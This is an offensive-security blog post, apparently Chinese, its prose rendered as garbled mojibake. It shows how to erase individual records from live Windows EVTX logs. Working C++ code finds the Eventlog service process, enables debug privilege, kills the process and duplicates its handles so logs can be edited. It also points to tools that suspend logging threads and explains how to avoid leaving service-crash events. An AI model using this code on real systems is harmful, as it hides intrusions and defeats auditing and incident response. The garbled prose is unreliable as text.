I"÷A<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>Windows XML Event Log (EVTX)å•æ¡æ—¥å¿—æ¸…é™¤ç³»åˆ—æ–‡ç« çš„ç¬¬ä¸‰ç¯‡ï¼Œä»‹ç»ç¬¬ä¸€ç§åˆ é™¤å½“å‰ç³»ç»Ÿevtxæ—¥å¿—æ–‡ä»¶å•æ¡æ—¥å¿—è®°å½•çš„æ–¹æ³•ï¼šå…³é—­æœåŠ¡å¯¹åº”çš„è¿›ç¨‹ï¼Œé‡Šæ”¾æ–‡ä»¶å¥æŸ„ï¼Œè§£é™¤æ–‡ä»¶å ç”¨ï¼Œåˆ é™¤æ—¥å¿—ï¼Œé‡å¯æœåŠ¡</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>é€šè¿‡cç¨‹åºæšä¸¾æœåŠ¡ä¿¡æ¯ï¼Œæå–EventlogæœåŠ¡å¯¹åº”è¿›ç¨‹svchost.exeçš„pid</li>
  <li>é€šè¿‡cç¨‹åºææƒå…³é—­Eventlogè¿›ç¨‹</li>
  <li>é€šè¿‡cç¨‹åºé‡Šæ”¾æ–‡ä»¶å¥æŸ„</li>
  <li>é€šè¿‡cç¨‹åºåˆ é™¤å•æ¡æ—¥å¿—æ–‡ä»¶</li>
</ul>

<h2 id="0x02-åˆ é™¤æ€è·¯">0x02 åˆ é™¤æ€è·¯</h2>
<hr />

<p>åœ¨ä¸Šç¯‡æ–‡ç« <a href="https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evtx%E6%96%87%E4%BB%B6%E7%9A%84%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">ã€ŠWindows XML Event Log (EVTX)å•æ¡æ—¥å¿—æ¸…é™¤ï¼ˆäºŒï¼‰â€”â€”ç¨‹åºå®ç°åˆ é™¤evtxæ–‡ä»¶çš„å•æ¡æ—¥å¿—è®°å½•ã€‹</a>ä»‹ç»äº†åˆ é™¤å•æ¡æ—¥å¿—è®°å½•çš„æ–¹æ³•ï¼Œä½†å¦‚æœç›´æ¥ç”¨æ¥åˆ é™¤å½“å‰ç³»ç»Ÿçš„æ—¥å¿—ï¼Œåœ¨æ‰“å¼€æ–‡ä»¶æ—¶ä¼šæŠ¥é”™ï¼Œæç¤ºæ–‡ä»¶è¢«å ç”¨</p>

<p>è¿™æ˜¯å› ä¸ºå½“å‰ç³»ç»Ÿå¯åŠ¨æ—¥å¿—æœåŠ¡Eventlogåï¼Œä¼šä»¥ç‹¬å æ¨¡å¼æ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œå¯¼è‡´å…¶ä»–è¿›ç¨‹æ— æ³•æ‰“å¼€è¯¥æ—¥å¿—æ–‡ä»¶ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡Œä¿®æ”¹æ“ä½œ</p>

<p>æœ‰ä»¥ä¸‹ä¸¤ç§è§£å†³æ–¹æ³•ï¼š</p>

<ol>
  <li>
    <p>ç»“æŸæ—¥å¿—æœåŠ¡Eventlogå¯¹åº”çš„è¿›ç¨‹ï¼Œé‡Šæ”¾æ–‡ä»¶å¥æŸ„ï¼Œè·å¾—ä¿®æ”¹æ—¥å¿—æ–‡ä»¶çš„æƒé™</p>
  </li>
  <li>
    <p>è·å¾—æ—¥å¿—æœåŠ¡Eventlogå¯¹åº”è¿›ç¨‹ä¸­æŒ‡å®šæ—¥å¿—æ–‡ä»¶çš„å¥æŸ„ï¼Œåˆ©ç”¨è¯¥å¥æŸ„å®ç°æ—¥å¿—æ–‡ä»¶çš„ä¿®æ”¹</p>
  </li>
</ol>

<p>æœ¬æ–‡å°†è¦ä»‹ç»ç¬¬ä¸€ç§è§£å†³æ–¹æ³•ï¼Œåˆ†äº«åœ¨ç¨‹åºå®ç°ä¸Šçš„ç»†èŠ‚ï¼Œæœ€åå¼€æºå®ç°ä»£ç </p>

<p>ç¬¬äºŒç§è§£å†³æ–¹æ³•ä¼šåœ¨ä¹‹åçš„æ–‡ç« è¿›è¡Œè¯¦ç»†ä»‹ç»</p>

<h2 id="0x03-è·å¾—eventlogæœåŠ¡å¯¹åº”è¿›ç¨‹svchostexeçš„pid">0x03 è·å¾—EventlogæœåŠ¡å¯¹åº”è¿›ç¨‹svchost.exeçš„pid</h2>
<hr />

<p>ç”±äºWindowsç³»ç»Ÿæœ‰å¤šä¸ªsvchost.exeè¿›ç¨‹ï¼Œæ— æ³•ç›´æ¥æœç´¢è¿›ç¨‹åâ€svchost.exeâ€è·å¾—EventlogæœåŠ¡å¯¹åº”çš„è¿›ç¨‹pid</p>

<p>æŸ¥è¯¢æ€è·¯ï¼š</p>

<p>æšä¸¾å½“å‰ç³»ç»ŸæœåŠ¡ï¼Œæ ¹æ®æœåŠ¡åç§°ç­›é€‰å‡ºå¯¹åº”çš„è¿›ç¨‹pid</p>

<h3 id="1é€šè¿‡powershellå®ç°">1ã€é€šè¿‡powershellå®ç°</h3>

<p>ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
</code></pre></div></div>

<h3 id="2é€šè¿‡cå®ç°">2ã€é€šè¿‡c++å®ç°</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
#pragma comment(lib,"Advapi32.lib") 
DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &amp;pcbBytesNeeded, &amp;servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -&gt; fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &amp;pcbBytesNeeded, &amp;servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i &lt; servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}
	if (PID == 0)
		printf("[!]Get EventLog's PID error\n");

	return PID;
}

int main(int argc, char *argv[])
{
	DWORD pid = getpid();
	return 0;
}
</code></pre></div></div>

<h2 id="0x04-ææƒå…³é—­eventlogè¿›ç¨‹">0x04 ææƒå…³é—­Eventlogè¿›ç¨‹</h2>
<hr />

<h3 id="1é€šè¿‡powershellå®ç°-1">1ã€é€šè¿‡powershellå®ç°</h3>

<p>æ‰§è¡Œcmdå‘½ä»¤taskkillå³å¯</p>

<h3 id="2é€šè¿‡cå®ç°-1">2ã€é€šè¿‡c++å®ç°</h3>

<p>c++çš„ä»£ç éœ€è¦æå‡æƒé™æ‰èƒ½ç»“æŸè¿›ç¨‹svchost.exe</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;

#pragma comment(lib,"Advapi32.lib") 

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &amp;pcbBytesNeeded, &amp;servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -&gt; fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &amp;pcbBytesNeeded, &amp;servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i &lt; servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}

	return PID;
}

int main(int argc, char *argv[])
{

	DWORD pid = getpid();
	if (pid == 0)
	{
		printf("[!]Get EventLog's PID error\n");
		return -1;
	}

	printf("[+]Try to EnableDebugPrivilege... ");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.&lt;%d&gt;\n", GetLastError());
		return -1;
	}
	printf("Done\n");

	printf("[+]Try to OpenProcess... ");
	HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (processHandle == NULL)
	{
		printf("Error\n");
		return -1;
	}
	printf("Done\n");

	printf("[+]Try to TerminateProcess... ");
	BOOL bResult = TerminateProcess(processHandle, 0);
	if (bResult == NULL)
	{
		printf("[!]Error\n");
		return -1;
	}
	printf("Done\n");

	return 0;
}
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>ç»“æŸEventlogæœåŠ¡å¯¹åº”çš„è¿›ç¨‹åï¼Œéš”ä¸€æ®µæ—¶é—´åEventlogæœåŠ¡ä¼šè‡ªåŠ¨é‡å¯</p>

<h2 id="0x05-é‡Šæ”¾æ–‡ä»¶å¥æŸ„">0x05 é‡Šæ”¾æ–‡ä»¶å¥æŸ„</h2>
<hr />

<p>ç»“æŸEventlogæœåŠ¡å¯¹åº”çš„è¿›ç¨‹åï¼Œè¿˜éœ€è¦é‡Šæ”¾æ—¥å¿—æ–‡ä»¶çš„å¥æŸ„ï¼Œæ‰èƒ½å¤Ÿè·å¾—æ–‡ä»¶çš„ä¿®æ”¹æƒé™</p>

<p><strong>å®ç°æ€è·¯ï¼š</strong></p>

<p>1.åˆ©ç”¨NtQuerySystemInformationæŸ¥è¯¢SystemHandleInformationè·å¾—æ‰€æœ‰è¿›ç¨‹çš„å¥æŸ„ä¿¡æ¯
2.æŒ‘é€‰å‡ºæ—¥å¿—è¿›ç¨‹ä¸­çš„æ‰€æœ‰å¥æŸ„
3.é‡Šæ”¾å¥æŸ„</p>

<p>å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
{
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	HANDLE processHandle = NULL;
	ULONG i;
	DWORD ErrorPID = 0;
	SYSTEM_HANDLE handle = { 0 };

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
		return 0;
	}
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtDuplicateObject");
	if (!NtDuplicateObject)
	{
		printf("[!]Could not find NtDuplicateObject entry point in NTDLL.DLL");
		return 0;
	}
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (!NtQueryObject)
	{
		printf("[!]Could not find NtQueryObject entry point in NTDLL.DLL");
		return 0;
	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("[!]NtQuerySystemInformation failed!\n");
		return 0;
	}

	UNICODE_STRING objectName;
	ULONG returnLength;
	for (i = 0; i &lt; handleInfo-&gt;HandleCount; i++)
	{
		handle = handleInfo-&gt;Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
		PVOID objectNameInfo = NULL;

		if (handle.ProcessId != pid)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (handle.ProcessId == ErrorPID)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId)))
		{
			printf("[!]Could not open PID %d!\n", handle.ProcessId);
			ErrorPID = handle.ProcessId;
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &amp;dupHandle, 0, 0, 0)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		objectNameInfo = malloc(0x1000);

		if (IsBlockingHandle(dupHandle) == TRUE) //filter out the object which NtQueryObject could hang on
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		CloseHandle(dupHandle);
	}
	free(handleInfo);

	return TRUE;
}
</code></pre></div></div>

<h2 id="0x06-ä¿®æ”¹æ—¥å¿—æ–‡ä»¶åˆ é™¤æ—¥å¿—è®°å½•">0x06 ä¿®æ”¹æ—¥å¿—æ–‡ä»¶ï¼Œåˆ é™¤æ—¥å¿—è®°å½•</h2>
<hr />

<p>ç»“æŸEventlogæœåŠ¡å¯¹åº”çš„è¿›ç¨‹åï¼Œè·å¾—äº†æ“ä½œæ—¥å¿—æ–‡ä»¶çš„æƒé™ï¼Œä¿®æ”¹æ—¥å¿—æ–‡ä»¶çš„æ–¹æ³•å’Œcä»£ç å¯å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« <a href="https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evtx%E6%96%87%E4%BB%B6%E7%9A%84%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">ã€ŠWindows XML Event Log (EVTX)å•æ¡æ—¥å¿—æ¸…é™¤ï¼ˆäºŒï¼‰â€”â€”ç¨‹åºå®ç°åˆ é™¤evtxæ–‡ä»¶çš„å•æ¡æ—¥å¿—è®°å½•ã€‹</a></p>

<p>ä»£ç å‚è€ƒåœ°å€ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/DeleteRecordbyTerminateProcess.cpp</code></p>

<p>ä»£ç å®ç°äº†è‡ªåŠ¨è·å¾—æ—¥å¿—æœåŠ¡çš„è¿›ç¨‹ï¼Œç»“æŸè¿›ç¨‹ï¼Œé‡Šæ”¾å¥æŸ„ï¼Œä¿®æ”¹æŒ‡å®šçš„ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶å†…å®¹ï¼Œä¿®æ”¹æˆåŠŸåé‡æ–°å¯åŠ¨æ—¥å¿—æœåŠ¡</p>

<p>ç¨‹åºæµ‹è¯•å¦‚å›¾ï¼š</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/1-1.png" alt="Alt text" /></p>

<h3 id="æ›´æ–°2018729">æ›´æ–°(2018.7.29)</h3>

<p>åœ¨githubä¸Šçœ‹åˆ°äº†å¦å¤–ä¸€ç§å®ç°æ€è·¯ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/360-A-Team/EventCleaner/blob/master/EventCleaner/</p>

<p>å€¼å¾—æ³¨æ„çš„æ˜¯æ—¥å¿—åˆ é™¤ä½¿ç”¨äº†WinAPI EvtExportLog</p>

<p>åˆ©ç”¨EvtExportLogå¯¹æ—¥å¿—æ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œè¿‡æ»¤æ¡ä»¶ä¸ºå»é™¤æŸä¸€æ¡æ—¥å¿—ï¼Œè¿™æ ·æ–°ç”Ÿæˆçš„æ–‡ä»¶å°±æ˜¯åˆ é™¤å•æ¡æ—¥å¿—åçš„æ–‡ä»¶</p>

<p>ä¼˜ç‚¹æ˜¯ä¸ç”¨è€ƒè™‘æ—¥å¿—åˆ é™¤çš„ç»†èŠ‚ï¼Œæ–‡ä»¶æ ¼å¼ä¸ä¼šå‡ºé”™ï¼Œæ–¹ä¾¿é«˜æ•ˆï¼Œå¹¶ä¸”ä¿®æ”¹è¿‡æ»¤æ¡ä»¶å¯ä»¥å¾ˆå®¹æ˜“åˆ é™¤ä¸€æ®µæ—¶é—´å†…çš„æ—¥å¿—</p>

<p>ä½†æ˜¯å­˜åœ¨ä¸€ç‚¹ä¸è¶³ï¼š</p>

<p>å¯¹äºåˆ é™¤æ—¥å¿—çš„åç»­æ—¥å¿—ï¼Œæ²¡æœ‰æ›´æ–°EventRecordID</p>

<p>ä¸¾ä¸ªç®€å•ä¾‹å­ï¼š</p>

<p>Security.evtxä¸‹é¢æœ‰10æ¡æ—¥å¿—ï¼ŒEventRecordIDä¸º1-10ï¼Œé€šè¿‡EvtExportLogåˆ é™¤ç¬¬8æ¡æ—¥å¿—ï¼Œç¬¬9å’Œç¬¬10æ¡æ—¥å¿—çš„EventRecordIDä¸å˜ï¼Œä»ç„¶ä¸º9å’Œ10ï¼Œä½†æ˜¯åˆ é™¤åçš„æ—¥å¿—æ€»æ•°ä¸º9ï¼ŒEventRecordIDä¾æ¬¡ä¸º1-7ï¼Œ9ï¼Œ10</p>

<p>æˆ‘çš„<a href="https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/DeleteRecordbyTerminateProcess.cpp">ä»£ç </a>ä¸­é‡‡ç”¨çš„æ–¹æ³•è™½ç„¶èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯éœ€è¦è€ƒè™‘å¾ˆå¤šç»†èŠ‚å’Œæ„å¤–æƒ…å†µï¼Œç¨‹åºå®ç°ä¸Šæ¯”è¾ƒå¤æ‚</p>

<p>æ‰€ä»¥ï¼Œæˆ‘åœ¨æˆ‘çš„å·¥ç¨‹ä¸­ä¹ŸåŠ å…¥äº†åˆ©ç”¨EvtExportLogåˆ é™¤æ—¥å¿—çš„æ–¹æ³•ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/DeleteRecordbyTerminateProcessEx.cpp</code></p>

<p>ä»£ç å®ç°äº†è‡ªåŠ¨è·å¾—æ—¥å¿—æœåŠ¡çš„è¿›ç¨‹ï¼Œç»“æŸè¿›ç¨‹ï¼Œé‡Šæ”¾å¥æŸ„ï¼Œåˆ©ç”¨EvtExportLogä¿®æ”¹æŒ‡å®šçš„ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶å†…å®¹ï¼Œä¿®æ”¹æˆåŠŸåé‡æ–°å¯åŠ¨æ—¥å¿—æœåŠ¡</p>

<p>ç¨‹åºæµ‹è¯•å¦‚å›¾ï¼š</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/1-2.png" alt="Alt text" /></p>

<h2 id="0x07-å…¶ä»–ç»†èŠ‚">0x07 å…¶ä»–ç»†èŠ‚</h2>
<hr />

<p>æŸäº›æƒ…å†µä¸‹ï¼Œå…³é—­Eventlogè¿›ç¨‹å’Œé‡å¯æœåŠ¡Eventlogä¼šäº§ç”Ÿæ—¥å¿—æ–‡ä»¶ï¼Œä½äºsystem.evtxä¸‹ï¼ŒEventIDä¸º<code class="language-plaintext highlighter-rouge">7034</code>å’Œ<code class="language-plaintext highlighter-rouge">7036</code></p>

<p>ä¸ºäº†é¿å…äº§ç”Ÿæ—¥å¿—7034å’Œ7036ï¼Œå¯é€šè¿‡å…³é—­æ—¥å¿—æœåŠ¡Eventlogçº¿ç¨‹çš„æ–¹æ³•å…³é—­æ—¥å¿—è®°å½•åŠŸèƒ½</p>

<p>å…³é—­æ—¥å¿—æœåŠ¡Eventlogçº¿ç¨‹çš„powershellå®ç°ä»£ç ï¼š</p>

<p>https://github.com/hlldz/Invoke-Phant0m</p>

<p>å…³é—­æ—¥å¿—æœåŠ¡Eventlogçº¿ç¨‹çš„cå®ç°ä»£ç ï¼š</p>

<p>https://github.com/3gstudent/Windwos-EventLog-Bypass</p>

<p>ä»‹ç»ç»†èŠ‚çš„åˆ†ææ–‡ç« ï¼š</p>

<p><a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8API-NtQueryInformationThread%E5%92%8CI_QueryTagInformation%E5%AE%9E%E7%8E%B0%E5%AF%B9Windwos%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%9A%84%E7%BB%95%E8%BF%87">ã€Šåˆ©ç”¨API NtQueryInformationThreadå’ŒI_QueryTagInformationå®ç°å¯¹Windwosæ—¥å¿—ç›‘æ§çš„ç»•è¿‡ã€‹</a></p>

<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œé€šå¸¸æ˜¯å…ˆçº¿ç¨‹æŒ‚èµ·ï¼Œæœ€åå†æ¢å¤çº¿ç¨‹</p>

<p>å‚è€ƒåœ°å€ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/SuspendorResumeTid.cpp</code></p>

<p>ä»£ç æ”¯æŒæŒ‚èµ·ã€æ¢å¤å’Œç»“æŸæ—¥å¿—æœåŠ¡çš„çº¿ç¨‹ï¼Œå¯ç”¨æ¥å…³é—­å’Œæ¢å¤æ—¥å¿—è®°å½•åŠŸèƒ½</p>

<h2 id="0x07-å°ç»“">0x07 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†é€šè¿‡å…³é—­æœåŠ¡å¯¹åº”çš„è¿›ç¨‹ï¼Œé‡Šæ”¾æ–‡ä»¶å¥æŸ„ï¼Œè§£é™¤æ–‡ä»¶å ç”¨ï¼Œåˆ é™¤å½“å‰ç³»ç»Ÿå•æ¡æ—¥å¿—è®°å½•çš„æ–¹æ³•ã€‚</p>

<p>ä¼˜åŒ–å…³é—­æ—¥å¿—è®°å½•åŠŸèƒ½çš„ä»£ç ï¼Œæ·»åŠ æŒ‚èµ·å’Œæ¢å¤çš„ä»£ç ï¼Œæ”¯æŒå…³é—­å’Œé‡æ–°å¼€å¯ç³»ç»Ÿçš„æ—¥å¿—åŠŸèƒ½</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET